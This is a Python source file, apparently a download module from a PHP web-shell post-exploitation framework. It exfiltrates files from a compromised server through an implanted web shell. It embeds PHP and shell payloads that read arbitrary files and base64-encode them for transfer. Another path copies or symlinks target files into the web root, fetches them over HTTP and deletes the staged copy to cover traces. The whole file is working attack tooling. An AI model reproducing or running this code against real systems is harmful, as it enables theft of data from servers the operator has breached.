'''
Created on 24/ago/2011

@author: norby
'''
from core.module import Module, ModuleException
from core.http.request import Request
from base64 import b64decode
from hashlib import md5
from random import randint

classname = 'Download'
    
class Download(Module):
    '''Download binary/ascii files from target filesystem
    :file.download <remote path> <locale path>
    '''
    
    vectors_order = { 'shell.php' : [  "file", "fread", "file_get_contents", "copy", "symlink"], 
                      'shell.sh'  : [ "base64" ]
                     }
    
    vectors = { 'shell.php' : { 
                               "file"             : "print(@base64_encode(implode('', file('%s'))));",
                               "fread"            : "$f='%s'; print(@base64_encode(fread(fopen($f,'rb'),filesize($f))));",
                                "file_get_contents"     : "print(@base64_encode(file_get_contents('%s')));",
                                "copy"       : "@copy('compress.zlib://%s','%s') && print(1);",
                                "symlink"     : "@symlink('%s','%s') && print(1);"
                                },
                'shell.sh' : {
                                "base64" : "base64 -w 0 %s"
                                }
               }
    
    
    def __init__(self, modhandler, url, password):
        
        self.encoder_callable = False
        self.md5_callable = False
        
        
        self.payload = None
        self.vector = None
        self.interpreter = None
        self.transfer_dir = None
        self.transfer_url_dir = None
        
        
        Module.__init__(self, modhandler, url, password)

        
    def _probe(self):
        
        if self.modhandler.load('shell.php').run("is_callable('base64_encode') && print('1');") == '1':
            self.encoder_callable = True
        else:
            self.mprint('[%s] PHP \'base64_encode\' transfer methods not available.' % self.name)

            
    def __slack_probe(self, remote_path, local_path):
                
        interpreter, vector = self._get_default_vector()
        if interpreter and vector:
            return self.__execute_payload(interpreter, vector, remote_path, local_path)
                
        for interpreter in self.vectors:
            if interpreter in self.modhandler.loaded_shells:
                for vector in self.vectors_order[interpreter]:
                    response = self.__execute_payload(interpreter, vector, remote_path, local_path)
                    if response:
                        return response
                    
                    
                    
        raise ModuleException(self.name,  "File download failed")     
    
                    
    def __execute_payload(self, interpreter, vector, remote_path, local_path):
        
                    payload = self.vectors[interpreter][vector]
                    
                    if payload.count( '%s' ) == 1:
                        payload = payload % remote_path
                        
                    if (vector == 'copy' or vector == 'symlink') and payload.count( '%s' ) == 2:
                        
                        if not (self.transfer_dir and self.transfer_url_dir and self.file_path):
                            
                            try:
                                self.modhandler.load('find.webdir').run('auto')
                            except ModuleException, e:
                                self.mprint('[!] [' + e.module + '] ' + e.error)
                                return
                            
                            self.transfer_url_dir = self.modhandler.load('find.webdir').url
                            self.transfer_dir = self.modhandler.load('find.webdir').dir
                        
                            filename = '/' + str(randint(11, 999)) + remote_path.split('/').pop();
                            self.file_path = self.transfer_dir + filename
                            self.url = self.transfer_url_dir + filename
                        
                        payload = payload % (remote_path, self.file_path)
                        
                        
                    response = self.modhandler.load(interpreter).run(payload)
                    
                    if response:
                        
                        self.payload = payload
                        self.interpreter = interpreter
                        self.vector = vector
                        
                        return response
  
     
     
    def __process_response(self,response, remote_path, local_path):
        
        if self.vector == 'copy' or self.vector == 'symlink':
            
            
            if self.modhandler.load('file.check').run(self.file_path, 'exists'):
                
                self.mprint("[%s] Reading file via \'%s\' and removing" % (self.name, self.url))
                
                response = Request(self.url).read()
                
                if self.modhandler.load('shell.php').run("unlink('%s') && print('1');" % self.file_path) != '1':
                    self.mprint("[!] [%s] Error cleaning support file %s" % (self.name, self.file_path))
                    
                    
            else:
                    self.mprint("[!] [%s] Error checking existance of %s" % (self.name, self.file_path))
                
            
        else:
            if self.encoder_callable:
                try:
                    response = b64decode(response)
                except TypeError:
                    self.mprint("[!] [%s] Error, unexpected file content")
                    
                    
        if response:

            try:
                f = open(local_path,'wb')
                f.write(response)
                f.close()
            except Exception, e:
                self.mprint('[!] [%s] Some error occurred writing local file \'%s\'.' % (self.name, local_path))
                raise ModuleException(self.name, e)
            
    
            response_md5 = md5(response).hexdigest()
            remote_md5 = self.modhandler.load('file.check').run(remote_path, 'md5')
            
            if not remote_md5:
                self.mprint('[!] [%s] MD5 hash method is not callable with \'%s\', check disabled' % (self.name, remote_path))
                return response
            elif not  remote_md5 == response_md5:
                self.mprint('[%s] MD5 hash of \'%s\' file mismatch, file corrupted' % (self.name, local_path))
            else:
                self.mprint('[%s] File correctly downloaded to \'%s\' using method \'%s\'' % (self.name, local_path, self.vector))
                return response

     
    def run(self, remote_path, local_path, returnFileData = False):
        
        self.__slack_probe(remote_path, local_path)
        response = self.modhandler.load(self.interpreter).run(self.payload)
        
        if response:
            file_response = self.__process_response(response,remote_path, local_path)
            if returnFileData:
                return file_response
            else:
                return
            
        raise ModuleException(self.name,  "File read failed")
        
        
            
            
        
